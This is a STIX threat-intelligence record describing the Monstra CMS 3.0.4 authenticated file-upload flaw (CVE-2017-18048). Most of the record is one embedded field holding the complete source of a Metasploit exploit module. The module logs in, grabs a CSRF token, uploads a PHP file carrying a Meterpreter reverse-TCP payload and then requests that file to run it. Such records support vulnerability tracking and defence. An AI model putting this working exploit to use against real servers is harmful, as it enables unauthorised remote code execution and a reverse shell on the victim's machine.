{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7c9ba903-f8ac-463a-9f81-f402eea3043f",
    "created": "2024-08-14T17:09:50.613282Z",
    "modified": "2024-08-14T17:09:50.613286Z",
    "name": "Monstra CMS Authenticated Arbitrary File Upload",
    "description": " MonstraCMS 3.0.4 allows users to upload Arbitrary files which leads to remote command execution on the remote server. An attacker may choose to upload a file containing PHP code and run this code by accessing the resulting PHP file. This module was tested against MonstraCMS 3.0.4.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/monstra_fileupload_exec.rb",
            "external_id": "monstra_fileupload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Monstra CMS Authenticated Arbitrary File Upload',\n      'Description' => %q{\n         MonstraCMS 3.0.4 allows users to upload Arbitrary files which leads to remote command execution on the remote server.\n         An attacker may choose to upload a file containing PHP code and run this code by accessing the resulting PHP file.\n         This module was tested against MonstraCMS 3.0.4.\n       },\n\n      'Author' =>\n        [\n          'Ishaq Mohammed <shaikhishaq201@gmail.com>', # Discoverer & Proof of Concept\n          'Touhid M.Shaikh <touhidshaikh22@gmail.com>', # Metasploit Module\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE','2017-18048'],\n          ['EDB','43348'],\n          ['URL','https://blogs.securiteam.com/index.php/archives/3559'],\n          ['URL','https://securityprince.blogspot.com/2017/12/monstra-cms-304-arbitrary-file-upload.html?m=1'],\n          ['URL','https://www.youtube.com/watch?v=-ziZ6DELbzw']\n        ],\n       'DefaultOptions' =>\n          {\n            'PAYLOAD' => 'php/meterpreter/reverse_tcp',\n            'Encoder' => 'php/base64'\n          },\n       'Privileged' => false,\n       'Platform'   => ['php'],\n       'Arch'       => ARCH_PHP,\n       'Targets' =>\n        [\n          ['Monstra CMS 3.0.4', { }],\n        ],\n       'DefaultTarget'  => 0,\n       'DisclosureDate' => '2017-12-18'))\n\n        register_options(\n        [\n          OptString.new('TARGETURI', [ true, \"Base Monstra CMS directory path\", '/']),\n          OptString.new('USERNAME', [ true, \"Username to authenticate with\", '']),\n          OptString.new('PASSWORD', [ true, \"Password to authenticate with\", ''])\n        ])\n    end\n\n  def check\n    begin\n      res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path,'admin', 'index.php') })\n    rescue\n      vprint_error(\"Unable to access the index.php file\")\n      return CheckCode::Unknown\n    end\n\n    if res and res.code != 200\n      vprint_error(\"Error accessing the index.php file\")\n      return CheckCode::Unknown\n    end\n\n    if res.body =~ /<\\/a>.*?Version (\\d+\\.\\d+\\.\\d+)/i\n      version = Rex::Version.new($1)\n      vulnVersion = Rex::Version.new('3.0.4')\n      vprint_status(\"Monstra CMS: #{version}\")\n\n      if version > vulnVersion\n        return CheckCode::Safe\n      elsif version == vulnVersion\n        return CheckCode::Appears\n      elsif version < vulnVersion\n        return CheckCode::Detected\n      end\n    end\n  end\n\n  def uri\n    target_uri.path\n  end\n\n  def login\n    res = nil\n    vprint_status('Trying to Login ......')\n    # Send Creds with cookies.\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, 'admin', 'index.php'),\n      'vars_post' => {\n        'login' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD'],\n        'login_submit' => 'Log+In'\n      }\n    })\n    cookies = res.get_cookies\n\n    fail_with(Failure::Unreachable, \"#{peer} - Did not respond to Login request\") if res.nil?\n\n    # Try to access index page with authenticated cookie.\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, 'admin' '/index.php'),\n      'cookie' => cookies\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Did not respond to Login request\") if res.nil?\n\n    # if we redirect to core_welcome then we assume we have authenticated cookie.\n    if res.code == 302 && res.headers['Location'].include?('index.php?id=dashboard')\n      print_good(\"Authentication successful : [ #{datastore['USERNAME']} : #{datastore['PASSWORD']} ]\")\n      store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])\n      return cookies\n    else\n      fail_with(Failure::Unreachable, \"#{peer} - Authentication Failed :[ #{datastore['USERNAME']}:#{datastore['PASSWORD']} ]\")\n    end\n  end\n\n  def exploit\n    #Login Function Execute and Return Cookies\n    cookies = login\n\n    #Random payload name.\n    pay_name = \"#{rand_text_alpha(5..10)}.PHP\"\n\n\n    # Payload Gen.\n    evilbyte = \"<?php #{payload.encoded}; ?>\"\n\n    # Request for CSRF token for file upload.\n    res = send_request_cgi({\n      'uri' => normalize_uri(uri, 'admin', '/index.php'),\n      'vars_get' => {'id' => 'filesmanager'},\n      'method' => 'GET',\n      'cookie' => cookies\n    })\n\n    # Grabbing CSRF token from body\n    /<input type=\"hidden\" id=\"csrf\" name=\"csrf\" value=\"(?<csrf>[a-z0-9\"]+)\">/ =~ res.body\n    fail_with(Failure::Unreachable, \"#{peer} - Could not determine CSRF token\") if csrf.nil?\n    vprint_good(\"CSRF-Token for File Upload : #{csrf}\")\n\n    # setup POST request.\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(csrf, content_type = nil, transfer_encoding = nil, content_disposition = 'form-data; name=\"csrf\"') # CSRF token #form-data; name=\"file\"; filename=\"agent22.PHP\"\n    post_data.add_part(\"#{evilbyte}\", content_type = 'application/x-php', transfer_encoding = nil, content_disposition = \"form-data; name=\\\"file\\\"; filename=\\\"#{pay_name}\\\"\")  # payload\n    post_data.add_part(\"Upload\", content_type = nil, transfer_encoding = nil, content_disposition = 'form-data; name=\"upload_file\"')  # extra\n    data = post_data.to_s\n\n    vprint_status(\"Trying to upload file #{pay_name} with malicious content....\")\n    # Lets Send Upload request.\n    res = send_request_cgi({\n      'uri' => normalize_uri(uri, 'admin', '/index.php'),\n      'vars_get' => {'id' => 'filesmanager'},\n      'method' => 'POST',\n      'cookie' => cookies,\n      'Connection' => 'close',\n      'data' => data,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\"\n    })\n\n    # Cleanup delete payload after get meterpreter.\n    register_files_for_cleanup(pay_name)\n\n\n    # Execute our payload simply call to payload.\n    print_status(\"Executing Payload \" )\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, 'public', 'uploads', pay_name)\n    })\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-12-18",
    "x_mitre_platforms": [
        "['php']"
    ]
}